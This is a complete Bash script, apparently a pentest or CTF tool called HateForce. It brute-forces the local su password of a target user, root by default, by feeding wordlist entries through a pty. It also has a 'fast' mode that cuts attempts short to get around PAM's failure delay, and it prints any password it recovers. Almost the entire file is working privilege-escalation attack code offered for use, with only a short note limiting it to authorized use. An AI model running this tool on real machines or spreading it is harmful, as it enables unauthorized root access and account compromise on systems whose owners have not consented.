#!/usr/bin/env bash
#
#  HateForce  -  by IHATEFW
#  Local su password brute-forcer for authorized privilege-escalation
#  testing (CTF / pentest engagements). Tests passwords against the LOCAL
#  machine's `su` only. Use only on systems you own or are authorized to test.
#
#  Pure-Bash port (no Python required). Needs: bash, su, script (util-linux),
#  timeout (coreutils) — present on virtually every Linux.
#
#  Usage:
#     bash hateforce.sh -u root -w wordlist.txt
#     bash hateforce.sh -u user -w rockyou.txt --fast
#
set -u

# Use a dot as decimal separator for awk/printf regardless of system locale,
# while keeping UTF-8 so the banner box-drawing characters render correctly.
export LC_NUMERIC=C

# ----------------------------------------------------------------------------
# Colors (256-color shades: red -> orange -> purple, matching the py version)
# ----------------------------------------------------------------------------
setup_colors() {
  if [ "${NO_COLOR:-0}" = "1" ] || [ ! -t 1 ]; then
    R= ; G= ; Y= ; B= ; M= ; CY= ; W= ; GREY= ; BOLD= ; DIM= ; RESET=
    RED= ; ORANGE= ; ORANGE2= ; PURPLE= ; PURPLE2=
  else
    R=$'\033[91m'; G=$'\033[92m'; Y=$'\033[93m'; B=$'\033[94m'
    M=$'\033[95m'; CY=$'\033[96m'; W=$'\033[97m'; GREY=$'\033[90m'
    BOLD=$'\033[1m'; DIM=$'\033[2m'; RESET=$'\033[0m'
    RED=$'\033[38;5;196m'; ORANGE=$'\033[38;5;208m'; ORANGE2=$'\033[38;5;202m'
    PURPLE=$'\033[38;5;135m'; PURPLE2=$'\033[38;5;99m'
  fi
}

# ----------------------------------------------------------------------------
# Banner
# ----------------------------------------------------------------------------
print_banner() {
  local user=$1 wordlist=$2 total=$3
  local b0=' _   _    _  _____ _____ _____ ___  ____   ____ _____ '
  local b1='| | | |  / \|_   _| ____|  ___/ _ \|  _ \ / ___| ____|'
  local b2='| |_| | / _ \ | | |  _| | |_ | | | | |_) | |   |  _|  '
  local b3='|  _  |/ ___ \| | | |___|  _|| |_| |  _ <| |___| |___ '
  local b4='|_| |_/_/   \_\_| |_____|_|   \___/|_| \_\\____|_____|'
  local a0=' ___        ___ _  _   _ _____ ___ _____      __'
  local a1='| _ )_  _  |_ _| || | /_\_   _| __| __\ \    / /'
  local a2='| _ \ || |  | || __ |/ _ \| | | _|| _| \ \/\/ / '
  local a3='|___/\_, | |___|_||_/_/ \_\_| |___|_|   \_/\_/  '
  local a4='     |__/'
  echo
  printf '  %s\n' "${RED}${BOLD}${b0}${RESET}"
  printf '  %s\n' "${ORANGE2}${BOLD}${b1}${RESET}"
  printf '  %s\n' "${ORANGE}${BOLD}${b2}${RESET}"
  printf '  %s\n' "${PURPLE}${BOLD}${b3}${RESET}"
  printf '  %s\n' "${PURPLE2}${BOLD}${b4}${RESET}"
  echo
  printf '  %s\n' "${PURPLE}${BOLD}${a0}${RESET}"
  printf '  %s\n' "${PURPLE}${BOLD}${a1}${RESET}"
  printf '  %s\n' "${PURPLE}${BOLD}${a2}${RESET}"
  printf '  %s\n' "${PURPLE}${BOLD}${a3}${RESET}"
  printf '  %s\n' "${PURPLE}${BOLD}${a4}${RESET}"
  echo
  echo "${GREY}  Local privilege-escalation brute-forcer  ·  authorized use only${RESET}"
  echo "${GREY}  --------------------------------------------------------------${RESET}"
  printf '  %sTarget user %s: %s%s%s%s\n' "$CY" "$RESET" "$W" "$BOLD" "$user" "$RESET"
  printf '  %sWordlist    %s: %s%s%s\n'   "$CY" "$RESET" "$W" "$wordlist" "$RESET"
  printf '  %sPasswords   %s: %s%s%s\n'   "$CY" "$RESET" "$W" "$total" "$RESET"
  echo "${GREY}  --------------------------------------------------------------${RESET}"
  echo
}

# ----------------------------------------------------------------------------
# Progress bar
# ----------------------------------------------------------------------------
progress() {
  local done=$1 total=$2 start=$3 current=$4
  local width=32
  local now shown filled pct rate eta bar i
  now=$(date +%s.%N)

  read -r filled pct rate eta < <(awk -v d="$done" -v t="$total" -v s="$start" \
      -v n="$now" -v W="$width" 'BEGIN{
        frac=(t>0)?d/t:1; if(frac>1)frac=1;
        filled=int(W*frac+0.5);
        el=n-s; rate=(el>0)?d/el:0; eta=(rate>0)?(t-d)/rate:0;
        printf "%d %.1f %.0f %.0f", filled, frac*100, rate, eta
      }')

  bar=""
  for ((i=0; i<filled; i++)); do bar+="█"; done
  bar="${G}${bar}${GREY}"
  for ((i=filled; i<width; i++)); do bar+="░"; done
  bar="${bar}${RESET}"

  shown=$current
  if [ "${#shown}" -gt 18 ]; then shown="${shown:0:15}..."; fi

  printf '\r  %s[%s%s]%s %s%5.1f%%%s %s%s/%s%s %s%4d/s%s %seta %4ds%s %stry:%s %s%-18s%s' \
    "$Y" "$RESET" "$bar" "$Y$RESET" \
    "$W" "$pct" "$RESET" \
    "$DIM" "$done" "$total" "$RESET" \
    "$CY" "$rate" "$RESET" \
    "$DIM" "$eta" "$RESET" \
    "$M" "$RESET" \
    "$W" "$shown" "$RESET"
}

# ----------------------------------------------------------------------------
# Core: test a single password against local `su`
# ----------------------------------------------------------------------------
# Returns:  0 = success (authenticated)
#           1 = failure (wrong password)
#         124 = timed out / inconclusive
try_password() {
  local user=$1 pass=$2 rc
  # `su` reads the password from the controlling terminal, so we drive it
  # inside a pty allocated by `script`. The small PROMPT_WAIT delay lets su
  # print "Password:" before we feed the input (su flushes type-ahead).
  { sleep "$PROMPT_WAIT"; printf '%s\n' "$pass"; } \
    | timeout -s KILL "$TIMEOUT" script -qec "su $(printf '%q' "$user") -c true" /dev/null \
    >/dev/null 2>&1
  rc=$?
  # timeout reports 124 (TERM) or 137 (128+SIGKILL) when it had to kill the
  # attempt; normalize both to 124 = timed out / inconclusive.
  [ "$rc" -eq 137 ] && rc=124
  return $rc
}

# ----------------------------------------------------------------------------
# Help
# ----------------------------------------------------------------------------
usage() {
  cat <<EOF
HateForce - local su password brute-forcer (authorized use only)

Usage: bash hateforce.sh -w WORDLIST [options]

  -u, --user USER       target user (default: root)
  -w, --wordlist FILE   path to password wordlist (required)
  -t, --timeout SEC     per-attempt timeout in seconds (default: 5)
  -d, --delay SEC       delay between attempts in seconds (default: 0)
      --fast            fast mode: short timeout exploiting PAM's fail-delay
                        (lento=fallo). Much faster but may miss a valid
                        password on slow/loaded machines.
      --prompt-wait SEC delay before sending the password, waiting for su's
                        prompt (default: 0.3)
      --no-color        disable colored output
  -h, --help            show this help

Example:
  bash hateforce.sh -u root -w rockyou.txt
  bash hateforce.sh -u alice -w passwords.txt --fast
EOF
}

# ----------------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------------
main() {
  local USER_T="root" WORDLIST="" DELAY=0 FAST=0
  NO_COLOR=0
  TIMEOUT=5
  PROMPT_WAIT=0.3
  local timeout_set=0

  while [ $# -gt 0 ]; do
    case "$1" in
      -u|--user)        USER_T=${2:?missing value for $1}; shift 2 ;;
      -w|--wordlist)    WORDLIST=${2:?missing value for $1}; shift 2 ;;
      -t|--timeout)     TIMEOUT=${2:?missing value for $1}; timeout_set=1; shift 2 ;;
      -d|--delay)       DELAY=${2:?missing value for $1}; shift 2 ;;
      --fast)           FAST=1; shift ;;
      --prompt-wait)    PROMPT_WAIT=${2:?missing value for $1}; shift 2 ;;
      --no-color)       NO_COLOR=1; shift ;;
      -h|--help)        usage; exit 0 ;;
      *) echo "Unknown option: $1" >&2; usage >&2; exit 2 ;;
    esac
  done

  setup_colors

  # Dependency check
  local miss=""
  command -v su      >/dev/null 2>&1 || miss="$miss su"
  command -v script  >/dev/null 2>&1 || miss="$miss script"
  command -v timeout >/dev/null 2>&1 || miss="$miss timeout"
  if [ -n "$miss" ]; then
    echo "${R}[!] Missing required command(s):${RESET}$miss" >&2
    echo "${GREY}    Install 'util-linux' (script) and 'coreutils' (timeout).${RESET}" >&2
    exit 3
  fi

  if [ -z "$WORDLIST" ]; then
    echo "${R}[!] A wordlist is required (-w/--wordlist).${RESET}" >&2
    usage >&2
    exit 2
  fi
  if [ ! -r "$WORDLIST" ]; then
    echo "${R}[!] Wordlist not found or unreadable: $WORDLIST${RESET}" >&2
    exit 1
  fi

  # --fast lowers the timeout unless the user set one explicitly. The budget
  # covers the prompt wait plus a short window: a correct password returns
  # fast, a wrong one is killed before PAM's fail-delay completes.
  if [ "$FAST" = "1" ] && [ "$timeout_set" = "0" ]; then
    TIMEOUT=$(awk -v p="$PROMPT_WAIT" 'BEGIN{printf "%.2f", p+0.6}')
  fi

  # Load wordlist, drop trailing empty lines.
  local passwords=()
  mapfile -t passwords < "$WORDLIST"
  while [ "${#passwords[@]}" -gt 0 ] && [ -z "${passwords[${#passwords[@]}-1]}" ]; do
    unset 'passwords[${#passwords[@]}-1]'
  done
  local total=${#passwords[@]}
  if [ "$total" -eq 0 ]; then
    echo "${R}[!] Wordlist is empty.${RESET}" >&2
    exit 1
  fi

  print_banner "$USER_T" "$WORDLIST" "$total"

  if [ "$FAST" = "1" ]; then
    echo "  ${Y}[fast] timeout=${TIMEOUT}s — 'lento = fallo'. Puede perder una clave válida en máquinas lentas.${RESET}"
    echo
  fi

  # Ctrl+C handler
  trap 'printf "\n\n  %s[~] Interrupted by user.%s\n\n" "$Y" "$RESET"; exit 130' INT

  local start found="" inconclusive=0 i=0 pw rc
  start=$(date +%s.%N)

  for pw in "${passwords[@]}"; do
    i=$((i+1))
    progress "$i" "$total" "$start" "$pw"
    try_password "$USER_T" "$pw"
    rc=$?
    if [ "$rc" -eq 0 ]; then
      found=$pw
      FOUND_SET=1
      break
    elif [ "$rc" -eq 124 ]; then
      inconclusive=$((inconclusive+1))
    fi
    if [ "$DELAY" != "0" ]; then sleep "$DELAY"; fi
  done

  printf '\n\n'
  local elapsed
  elapsed=$(awk -v s="$start" -v n="$(date +%s.%N)" 'BEGIN{printf "%.1f", n-s}')

  if [ "${FOUND_SET:-0}" = "1" ]; then
    local shown=$found
    [ -z "$shown" ] && shown="(empty password)"
    echo "  ${G}${BOLD}[+] PASSWORD FOUND${RESET}"
    echo "  ${G}╔══════════════════════════════════════════════════╗${RESET}"
    echo "  ${G}║${RESET}  user: ${W}${BOLD}${USER_T}${RESET}"
    echo "  ${G}║${RESET}  pass: ${W}${BOLD}${shown}${RESET}"
    echo "  ${G}╚══════════════════════════════════════════════════╝${RESET}"
    echo
    echo "  ${GREY}Done in ${elapsed}s${RESET}"
    echo
    exit 0
  else
    echo "  ${R}[-] No valid password found in wordlist.${RESET}"
    echo "  ${GREY}Tried ${total} passwords in ${elapsed}s${RESET}"
    if [ "$FAST" = "1" ] && [ "$inconclusive" -gt 0 ]; then
      echo "  ${Y}[!] ${inconclusive} attempt(s) timed out (inconclusive). Re-run without --fast to be sure.${RESET}"
    fi
    echo
    exit 1
  fi
}

main "$@"
